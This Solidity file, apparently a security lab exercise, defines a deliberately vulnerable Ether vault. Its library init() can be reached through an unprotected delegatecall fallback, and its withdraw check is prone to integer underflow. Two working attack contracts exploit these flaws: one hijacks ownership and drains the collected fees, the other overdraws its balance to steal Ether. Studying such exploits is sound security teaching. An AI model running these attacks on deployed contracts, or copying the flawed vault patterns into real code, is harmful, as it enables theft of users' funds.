// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.6.0; // Do not change the compiler version.


/*
 * CryptoVault contract: A service for storing Ether.
 */
contract CryptoVault {
    address public owner;      // Contract owner.


    uint public collectedFees; // Amount of the balance that
                               // corresponds to fees.


    address tLib;              // Library used for handling ownership.


    uint8 prcFee;              // Percentage to be subtracted from
                               // deposited amounts to charge fees. A
                               // uint8 is used to represent
                               // percentage with two decimal
                               // digits. E.g, a value of 50 means a
                               // percentage of 0.50%


    mapping (address => uint256) public accounts;


    // Constructor sets the owner of this contract using a VaultLib
    // library contract, and an initial value for prcFee.
    // NOTE: delegatecall invoke functions from tLib,
    // but accessing to the storage contents of CryptoVault2.
    constructor(address _vaultLib, uint8 _prcFee) public {
        tLib = _vaultLib;
        prcFee = _prcFee;
        //Llamada de delegatecall
        (bool success,) = tLib.delegatecall(abi.encodeWithSignature("init(address)",msg.sender));
        require(success,"delegatecall failed");
    }


    // deposit allows clients to deposit amounts of Ether. A percentage
    // of the deposited amount is set aside as a fee for using this
    // vault.
    function deposit() public payable{
        require (msg.value >= 100, "Insufficient deposit");
        uint fee = msg.value * prcFee / 10000; // two decimal digits
        accounts[msg.sender] += msg.value - fee; //Comisión que se resta de las cantidades depositadas.
        collectedFees += fee;
    }


    // withdraw allows clients to recover part of the amounts deposited
    // in this vault.
    function withdraw(uint _amount) public {
        require (accounts[msg.sender] - _amount >= 0, "Insufficient funds");
        accounts[msg.sender] -= _amount;
        (bool sent, ) = msg.sender.call{value: _amount}("");
        require(sent, "Failed to send funds");
    }


    // withdrawAll is similar to withdraw, but withdrawing all Ether
    // deposited by a client.
    function withdrawAll() public {
        uint amount = accounts[msg.sender];
        require (amount > 0, "Insufficient funds");
        accounts[msg.sender] = 0;
        (bool sent, ) = msg.sender.call{value: amount}("");
        require(sent, "Failed to send funds");
    }


    // Any other function call is redirected to VaultLib library
    // functions. NOTE: delegatecalls invoke functions from tLib,
    // but accessing to the storage contents of CryptoVault2.


    fallback () external payable {
        //Llamadas de delegatecall
        (bool success,) = tLib.delegatecall(msg.data);
        require(success,"delegatecall failed");
    }
    receive () external payable {
        // Llamadas de delegatecall
        (bool success,) = tLib.delegatecall(msg.data);
        require(success,"delegatecall failed");
    }


}


/*
 * VaultLib: Funciones que solo puede ejecutar el owner del contrato.
 */
contract VaultLib {
    address public owner;


    uint public collectedFees; // Amount of the balance that
                               // corresponds to fees.


    address this_tLib;         // address of this library.


    modifier onlyOwner() {
        require(msg.sender == owner,"You are not the contract owner!");
        _;
    }


    // init is used to set the CryptoVault contract owner. It must be
    // called using delegatecall.
    function init(address _owner) public {
        owner = _owner;
    }


    // collectFees is used by the contract owner to transfer all fees
    // collected from clients so far.
    function collectFees() external onlyOwner {
        require (collectedFees > 0, "No fees collected");
        uint fees = collectedFees;
        collectedFees = 0;
        (bool sent, ) = owner.call{value: fees}("");
        require(sent, "Failed to send fees");
    }


    // Contract owner can update the library to be used.
    function setVaultLib(address _tLib) external onlyOwner {
        this_tLib = _tLib;
    }


    // Standard response for any non-standard call to CryptoVault.
    fallback () external payable {
        revert("Calling a non-existent function!");
    }


    // Standard response for plain transfers to CryptoVault.
    receive () external payable {
        revert("This contract does not accept transfers with empty call data");
    }
}




contract FallbackAttack{


    address attackedContract; //Contrato al que queremos atacar
    // address _owner;


    constructor(address at_contract) public {
        attackedContract = at_contract;
        // _owner = msg.sender;
    }


    function attack() external{
        //Cambiar el address del contrato-> Le paso la dirección de este contrato atacante
        attackedContract.call(abi.encodeWithSignature("init(address)", address(this)));
        // Recolectar las tarifas acumuladas
        attackedContract.call(abi.encodeWithSignature("collectFees()"));
    }


    // Retirar los fondos que he robado  attackedContract. Esos fondos los tiene este contrato atacante.
    function withdrawFunds() external {
        msg.sender.transfer(address(this).balance);
    }
 
    //Para poder recibir el Ether.
    receive() external payable { }
}

contract UnderflowAttack {

    address attackedContract; //Contrato al que queremos atacar
    // address _owner;


    constructor(address at_contract) public {
        attackedContract = at_contract;
        // _owner = msg.sender;
    }

    function deposit() external payable {
        require(msg.value >=100, "Has depositado una cantidad demasiado pequeña");

        (bool success, )=attackedContract.call{value:msg.value}(abi.encodeWithSignature("deposit()"));
        require(success, "No habido exito a la hora de depositar.");
    }

    function attack(uint256 cantidad) external{
        //Llamar a withdraw con una cantidad mayor al balance de mi contrato 
        (bool success,)= attackedContract.call(abi.encodeWithSignature("withdraw(uint256)", cantidad));
        require(success, "Encima de ladrón soy tonto y no se atacar");
    } 

    function withdrawStolenEther() external{
        msg.sender.transfer(address(this).balance);
    }


    receive() external payable { }

}
